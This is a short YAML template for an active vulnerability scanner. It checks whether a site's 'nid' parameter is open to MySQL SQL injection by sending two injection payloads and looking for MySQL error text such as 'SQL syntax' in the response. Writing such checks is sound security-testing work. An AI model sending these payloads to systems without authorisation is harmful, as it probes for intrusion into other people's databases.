id: sqli3-mysql-06
name: 'SQLi mysql prefix #5 in nid'
severity: high
type: active
tags:
  - sqli
  - injection
  - mysql
description: 'Triggers mysql error via nid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      nid:
        - '1" OR "1"="1'
        - '''))'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
